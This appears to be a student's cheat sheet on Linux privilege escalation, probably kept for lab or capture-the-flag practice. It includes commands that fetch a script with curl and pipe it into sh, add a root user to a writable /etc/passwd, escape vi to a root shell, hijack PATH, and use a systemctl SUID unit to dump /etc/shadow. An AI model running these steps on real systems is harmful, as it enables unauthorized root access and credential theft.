# Common Privsec in Linux

## Enumeration

LinEnum:

~~~
Usage:
python -m http.server [own machine]

wget <ip address of machine>/LinEnum
chmod +x LinEnum

./LinEnum

OPTIONS:
-k	Enter keyword
-e	Enter export location
-s 	Supply user password for sudo checks (INSECURE)
-t	Include thorough (lengthy) tests
-r	Enter report name (save report to current directory)
-h	Displays this help text

or 

curl <ip address>/LinEnum.sh | sh (cannot specify options)
~~~

Important outputs of LinEnum:
- Kernel: Kernel Information is shown here.
- Can we read/sensitive files.
- SUID Files: 
- Group membership: Says which users are in which group.
- Crontab Content:

## Abusing SUID/SGID files

- First set in privsec is checking SUID/GUID set up.
- SUID is set user ID/ SGID is set group ID.

~~~
SUID:
rws-rwx-rwx

SGID:
rwx-rws-rwx
~~~

Find SUID/SGID

~~~
find / -perm -u=s -type f 2>/dev/null
~~~

## Exploiting writeable /etc/passwd

- /etc/passwd is plain text
- Write permission should be only for root/superusers.
- Can be exploited if user has accidentently added to a write-group.

### Format of /etc/passwd

user:x:0:0:root:/root:/bin/bash

- Username: Used when the user logins.
- Password: x means it is encrypted in the etc/shadow file.
- User ID (UID): Each user is assigned a user ID. UID 0 is root, UID 1-99 for non.
- Group ID (GID): Primary group ID.
- User ID info: Comment field for the user, can contain phone numbers etc.
- Home directory: Absolute path to home directory.
- Command/shell: Abosulte path to command shell.

Exploting etc/passwd is easy, just create a new user.

- Need to create a password hash to add to the password section of /etc/passwd file  

~~~
openssl passwd -1 -salt [salt] [password]
~~~  
- Add to /etc/passwd

## Escaping vi Editor

- sudo -l checks which commands can be run as sudo.
- Running vi as sudo then :!sh escapes vi into root.

### Misconfigured Binaries and GTFObins.

-  GTFOBins is a list of Unix binaries that can be exploited  to bypass local security restrictions.
  (https://gtfobins.github.io/)
- If a misconfigured binary is found then look it up in GTFOBins.

## Exploiting Crontab

- View active cronjobs using cat /etc/crontab

### Cronjob format

~~~
# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

* = means blank

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly

~~~

Exploiting cronjob. Replace cronjob script with payload from msfvenom.

## Exploiting PATH Variable

- PATH specifies direcoties that hold executable programmes.
- When a command is run the executable file is searched using path variables.

### How to exploit path variables (example with SUID).
- Find an SUID with root.
- If the SUID runs a command the path can to the command can be changed.

~~~
cd /tmp

echo "/bin/bash" > [command to be run] 

chmod +x 
export PATH=/tmp:$PATH

run SUID.

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
(this resets the path)

~~~ 
	 
## Exploiting systemctl SUID

~~~
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "command you want here i.e cat /etc/shadow > /tmp/passwrds"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
~~~